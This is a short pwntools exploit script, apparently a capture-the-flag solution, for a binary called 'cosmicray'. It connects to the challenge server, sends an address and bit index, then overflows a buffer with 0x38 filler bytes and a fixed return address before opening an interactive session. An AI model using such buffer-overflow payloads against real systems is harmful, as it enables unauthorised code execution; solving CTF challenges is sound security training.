from pwn import *

exe = ELF("./cosmicray")
libc = ELF("./libc-2.35.so")
ld = ELF("./ld-2.35.so")

context.binary = exe

# p = process("./cosmicray")
p = remote("chals.sekai.team", 4077)

p.recvuntil(b"through it:")
p.sendline(b"0x4016f4")

p.recvuntil(b"(0-7):")
p.sendline(b"7")

payload = b"A" * 0x38 + p64(0x4012d6)

p.recvuntil(b"today:")
p.sendline(payload)

p.interactive()

